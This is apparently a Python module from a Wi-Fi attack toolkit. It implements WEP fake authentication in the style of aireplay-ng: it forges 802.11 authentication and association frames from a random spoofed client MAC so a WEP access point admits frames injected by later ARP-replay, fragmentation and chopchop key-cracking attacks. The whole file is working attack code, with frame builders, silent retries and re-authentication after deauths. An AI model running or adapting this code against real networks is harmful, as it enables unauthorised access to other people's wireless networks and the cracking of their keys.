"""WEP fake authentication (`aireplay-ng -1`).

Open-System Authentication + Association as a forged STA so the AP will accept
frames we inject later (ARP replay, fragmentation, chopchop). On its own it
generates no IVs — it's the prerequisite that unlocks the rest of the WEP suite.

LAZY / on-demand: ``start()`` only arms us (registers our MAC + an RX filter so
we still *hear* deauths); it does NOT authenticate. We stay invisible until a TX
path actually has something to send and calls ``ensure_associated()`` — so the
user isn't sitting "associated for no reason", re-announcing every interval. The
TX paths' own data frames keep the AP's inactivity timer alive while they run;
an explicit Deauth/Disassoc (or a replay stall) flips us out of ``associated``
so the *next* ``ensure_associated()`` re-auths within one window. No periodic
keepalive.

``ensure_associated()`` retries silently (3 attempts, ~1s each) and only logs a
FAILURE (once per episode) — and a one-line "recovered" if it later comes back.
Routine success is silent; the live status lives in the Focus SECURITY panel via
``state`` (idle / authenticating / associated / failed), ``next_reauth_at`` and
``fail_reason``.
"""

from __future__ import annotations

import asyncio
import logging
import os
import struct
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from wifit3.engine.models import AccessPoint

logger = logging.getLogger(__name__)

# Supported-rates IEs (same menu the PMKID harvester uses — APs only check
# well-formedness).
_SUPPORTED_RATES = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
_EXT_SUPPORTED_RATES = bytes([0x30, 0x48, 0x60, 0x6C])

# Capability Info for the Assoc Req: ESS (bit 0) + Privacy (bit 4). The
# Privacy bit is mandatory for a WEP network — an Assoc Req without it is
# rejected as a capability mismatch.
_CAP_ESS_PRIVACY = 0x0011

# 802.11 management subtypes we care about in the RX filter.
_SUBTYPE_ASSOC_RESP = 0x01
_SUBTYPE_AUTH = 0x0B
_SUBTYPE_DEAUTH = 0x0C
_SUBTYPE_DISASSOC = 0x0A


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast clear)."""
    return bytes([0x02]) + os.urandom(5)


@dataclass
class FakeAuthStats:
    auth_attempts: int = 0
    associations: int = 0
    reactive_reauths: int = 0
    started_at: float = field(default_factory=time.time)


class WepFakeAuth:
    """On-demand Open-System fake-auth against one WEP AP."""

    # ensure_associated() makes this many silent attempts (~assoc_timeout each)
    # before declaring failure — covers the common "first try whiffs, second
    # succeeds" flakiness without a scary log line.
    _MAX_ATTEMPTS = 3
    # After a failed episode, back off this long before the next attempt (so a
    # persistently-unreachable AP isn't hammered every loop tick).
    _FAIL_BACKOFF = 5.0

    def __init__(
        self,
        iface,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
        assoc_timeout: float = 1.0,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        self.assoc_timeout = assoc_timeout
        self._log = log_callback or (lambda _msg: None)

        self.stats = FakeAuthStats()
        # State machine surfaced to the UI. "ready" = armed but not associated
        # (the dormant default after start()).
        self.state: str = "idle"     # idle|ready|authenticating|associated|failed
        self.fail_reason: Optional[str] = None
        self.next_reauth_at: Optional[float] = None

        self._active = False
        # Serialize concurrent ensure_associated() callers (replay + frag/chop)
        # so they don't auth-storm each other.
        self._auth_lock = asyncio.Lock()
        # Set by the RX filter (sync), read by the auth round.
        self._assoc_ok = False
        # Whether we've logged the CURRENT failure episode — so we log a failure
        # once (not every backoff tick) and a "recovered" line once.
        self._announced_failure = False

    # ---- Frame builders -----------------------------------------------------

    def _build_auth_req(self) -> bytes:
        """Open-System Authentication Request (algo=0, seq=1, status=0)."""
        mac_hdr = (
            b"\xb0\x00"            # FC: mgmt, subtype Auth (0x0B)
            + b"\x00\x00"          # Duration
            + self.bssid_bytes     # Addr1 = BSSID (dest)
            + self.source_mac      # Addr2 = us (source)
            + self.bssid_bytes     # Addr3 = BSSID
            + b"\x00\x00"          # Seq (hardware fills)
        )
        body = b"\x00\x00" + b"\x01\x00" + b"\x00\x00"  # algo=0, seq=1, status=0
        return mac_hdr + body

    def _build_assoc_req(self) -> bytes:
        """Association Request: Privacy capability + SSID + rates, NO RSN IE
        (WEP predates RSN — an RSN IE would get us rejected)."""
        mac_hdr = (
            b"\x00\x00"            # FC: mgmt, subtype Assoc Req (0x00)
            + b"\x00\x00"
            + self.bssid_bytes
            + self.source_mac
            + self.bssid_bytes
            + b"\x00\x00"
        )
        cap_info = struct.pack("<H", _CAP_ESS_PRIVACY)
        listen_int = struct.pack("<H", 0x0001)
        ssid = (self.target.ssid or "").encode("utf-8", errors="ignore")[:32]
        ssid_ie = bytes([0x00, len(ssid)]) + ssid
        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie
        return mac_hdr + body

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        """Arm: register the self MAC + RX filter. Does NOT authenticate — that
        happens lazily on the first ``ensure_associated()`` when a TX path
        actually has something to send."""
        if self._active:
            return
        self._active = True
        self.stats = FakeAuthStats()
        self.state = "ready"
        self.fail_reason = None
        self.next_reauth_at = None
        self._announced_failure = False
        self.iface.register_self_mac(self.source_mac, bssid=self.target.bssid)
        self.iface.register_rx_callback(self._rx_cb)
        logger.info("[WEP-FakeAuth] Armed on %s as %s (lazy auth)",
                    self.target.bssid, _mac_str(self.source_mac))

    def stop(self) -> FakeAuthStats:
        """Tear down the RX filter and drop the YOU client. Idempotent."""
        if not self._active:
            return self.stats
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        self.iface.unregister_self_mac(self.source_mac)
        self.state = "idle"
        self.next_reauth_at = None
        logger.info(
            "[WEP-FakeAuth] Stopped: %d assoc(s), %d reactive re-auth(s).",
            self.stats.associations, self.stats.reactive_reauths,
        )
        return self.stats

    @property
    def is_active(self) -> bool:
        return self._active

    def request_reauth(self) -> None:
        """Drop our 'associated' belief so the next ``ensure_associated()`` re-
        authenticates (e.g. a replay stall that looks like a silent de-assoc,
        which the AP never signalled with a Deauth)."""
        if self.state == "associated":
            self.stats.reactive_reauths += 1
            self.state = "ready"
            self._assoc_ok = False

    # ---- On-demand association ----------------------------------------------

    async def ensure_associated(self) -> bool:
        """Guarantee we're associated before a TX path transmits. Fast path when
        already associated; otherwise authenticate (silently retrying), honoring
        a post-failure backoff. Returns True iff associated."""
        if not self._active:
            return False
        if self.state == "associated":
            return True
        if self._in_backoff():
            return False
        async with self._auth_lock:
            # Re-check under the lock — another caller may have just associated
            # (or just failed and entered backoff).
            if self.state == "associated":
                return True
            if self._in_backoff():
                return False
            return await self._try_associate()

    def _in_backoff(self) -> bool:
        return (
            self.state == "failed"
            and self.next_reauth_at is not None
            and time.time() < self.next_reauth_at
        )

    async def _try_associate(self) -> bool:
        """Up to ``_MAX_ATTEMPTS`` silent auth rounds. Logs only a failure (once
        per episode) or a one-line recovery."""
        for _attempt in range(self._MAX_ATTEMPTS):
            if not self._active:
                return False
            if await self._auth_round():
                self.state = "associated"
                self.fail_reason = None
                self.next_reauth_at = None
                self.stats.associations += 1
                if self._announced_failure:
                    self._log(
                        "[green]✓ Fake-Auth recovered[/green] "
                        f"[dim](associated as {_mac_str(self.source_mac)})[/dim]"
                    )
                    self._announced_failure = False
                return True

        # All attempts failed — back off and log once per episode.
        self.state = "failed"
        if not self.fail_reason:
            self.fail_reason = "no Assoc resp"
        self.next_reauth_at = time.time() + self._FAIL_BACKOFF
        if not self._announced_failure:
            self._announced_failure = True
            self._log(
                f"[red]✗ Fake-Auth failed:[/red] [white]{self.fail_reason}[/white] "
                f"[dim](retry in {int(self._FAIL_BACKOFF)}s)[/dim]"
            )
        return False

    async def _auth_round(self) -> bool:
        """One Auth → Assoc exchange; returns True iff the AP accepted us."""
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)

        self.state = "authenticating"
        self._assoc_ok = False
        self.stats.auth_attempts += 1

        await self.iface.send_no_wait(self._build_auth_req())
        await asyncio.sleep(0.1)  # let the AP process Auth before Assoc lands
        await self.iface.send_no_wait(self._build_assoc_req())

        deadline = time.time() + self.assoc_timeout
        while time.time() < deadline and self._active and not self._assoc_ok:
            await asyncio.sleep(0.05)
        return self._assoc_ok

    # ---- RX filter (sync, on the loop) --------------------------------------

    def _rx_cb(self, frame_bytes: bytes, rssi: int, ts: float) -> None:
        """Watch for AP replies addressed to our MAC. Keep this fast.

        Per-subtype length guards: a Deauth/Disassoc is only 26 bytes (24 B
        header + 2 B reason), so a blanket "len >= 28" gate would drop the
        very kicks we want to react to.
        """
        if not self._active or len(frame_bytes) < 24:
            return
        fc0 = frame_bytes[0]
        if (fc0 & 0x0C) != 0x00:   # management frames only
            return
        if frame_bytes[4:10] != self.source_mac:  # Addr1 (dest) must be us
            return
        subtype = (fc0 & 0xF0) >> 4

        if subtype == _SUBTYPE_ASSOC_RESP and len(frame_bytes) >= 28:
            # Body: Capability(2) + Status(2) + AID(2) → status at offset 26.
            status = struct.unpack("<H", frame_bytes[26:28])[0]
            if status == 0:
                self._assoc_ok = True
            else:
                self.fail_reason = f"Assoc rejected (status {status})"
        elif subtype == _SUBTYPE_AUTH and len(frame_bytes) >= 30:
            # Body: Algo(2) + Seq(2) + Status(2) → status at offset 28.
            status = struct.unpack("<H", frame_bytes[28:30])[0]
            if status != 0:
                self.fail_reason = f"Auth rejected (status {status})"
        elif subtype in (_SUBTYPE_DEAUTH, _SUBTYPE_DISASSOC):
            # We got kicked — drop our 'associated' belief so the next
            # ensure_associated() re-auths. No eager re-auth here.
            if self.state == "associated":
                self.stats.reactive_reauths += 1
            self.state = "ready"
            self._assoc_ok = False
            self.next_reauth_at = None
